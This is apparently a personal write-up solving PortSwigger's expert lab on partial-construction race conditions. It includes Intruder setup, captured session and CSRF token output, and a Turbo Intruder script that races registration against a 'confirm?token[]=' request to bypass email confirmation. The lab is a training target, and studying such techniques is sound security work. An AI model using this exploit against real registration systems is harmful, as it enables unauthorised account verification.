# Lab: Race Conditions Partial Construction - My Solution

When I noticed on the evening of Thursday the 9th of August that James
Kettle had published new research, [Smashing the state machine: the true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine) 
in connection with his talk at Defcon 2023 I was super exited to dig into
it. I was, however, also dead tired from spending the day exploring Vienna,
Austria with my family. So I promised myself I'd get started on the train
home the following day.

By early Saturday afternoon I had already finished the *apprentice* and
*practitioner* labs, and so I settled in for the 
new expert lab, [Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction).

It's tricky, as promised in James' article.

## My approach

One of the first things that I noticed was the phpsessionid cookie, which
is mentioned in both the research paper, and the academy article as being
something which would force requests to be sequential, and which would mask
race condition vulnerabilities. So I decided that my first step would be to
create a valid sessions, and gather the *phpsessionid* and corresponding
anti-csrf tokens.

I wasted about 4 hours trying to figure out how to use Burp macros and how
I could use the extracted variables in Turbo Intruder. I still believe
there's a way to make this work, but I finally decided to be a bit more
pragmatic. The key realisation is this: once a session is generated it's
likely to be valid for some time, possibly the entire lifetime of the lab
instance. So we can just generate them in advance in the stock Intruder.

Here's the request I used in Intruder:

```
GET /register HTTP/2
Host: <host>.web-security-academy.net
X-Count: §xxx§

```

![A simple GET request sent to intruder, and minimised, with an extra header for the dummy payload](resources/intruder_positions.png)

![The payload is just a count](resources/intruder_payloads.png)

![Extract the phpsessionid from all responses](resources/intruder_extract_phpsessionid.png)

![Extract the anti-CSRF token from all responses](resources/intruder_extract_csrf.png)


![The results from Intruder](resources/intruder_results.png)

Here's an example of the Intruder attack output. I just did a select all,
copy in the intruder output and pasted it into a file called
*sessions.txt*:

```
0		200	false	false	3147	wXjqeZ18d0p4orBWLRrws1JxPudsHBYp	jsmKE2V5e6kjazHLnP2SKstCQz1kaUQu	
1	0	200	false	false	3147	wX3xGn0tXJNsy6IO2C1vHE6E6UEu02Mz	1XsQ0sju2ZdexPQAdgeNNF5iXam8Rw52	
2	1	200	false	false	3147	0IrTeheHwCkaHkAZt383a7SS78VmiYMZ	driecRa3rIxHe3EXcngVCSGyy91AqpCH	
3	2	200	false	false	3147	rqpEdsfbYPlHj87T7wnYAj7Lo6ZROkyC	XpxZvfGzRqdlgsPRSiuxPNiArMWMUuI8	
~~~
97	96	200	false	false	3147	LebKIrc0hVlbONMVPVKlJ8H7yjOW3pD1	DJMwwAendB5reAfsZnYczptOefZc4NCV	
98	97	200	false	false	3147	dRr3IcrF804i8BebS3kLjZfUJgy2maVF	06ASdOwrFItk4mM6XEXWIFZQMRyZNXnX	
99	98	200	false	false	3147	IQrkT05XeVPhdhjgolVqvChdWWyaMhHK	wMDEwWqsfFeNkmQ8ZT4b3k97TDYDTqkn	
100	99	200	false	false	3147	H2MIypAPjMvFd5RjxmSThB0P82TwEaCO	HE2tPZ9HWAKMhpc8vWzdMeVDZPPyryJl	
```

Turbo-Intruder request:
```
POST /%s HTTP/2
Host: <host>.web-security-academy.net
Cookie: phpsessionid=%s
Content-Type: application/x-www-form-urlencoded

csrf=%s&username=%s&email=%s%40ginandjuice.shop&password=peter
```

Turbo-Intruder configuration:

```
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds the final byte of each request until openGate is invoked
    for line in open('/tmp/sessions.txt'):
        data = line.split('\t')
        phpsessionid = data[6]
        csrf = data[7]
        username = randstr(8)
        engine.queue(target.req, ['register',       phpsessionid, csrf, username, username], gate='race1', learn=1)
        engine.queue(target.req, ['confirm?token[]=', phpsessionid, csrf, username, username], gate='race1', learn=2)

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')
    #engine.openGate('race2')


def handleResponse(req, interesting):
    table.add(req)

```

![Turbo intruder setup](resources/turbo_intruder_setup.png)

![Turbo intruder results](resources/turbo_intruder_success.png)


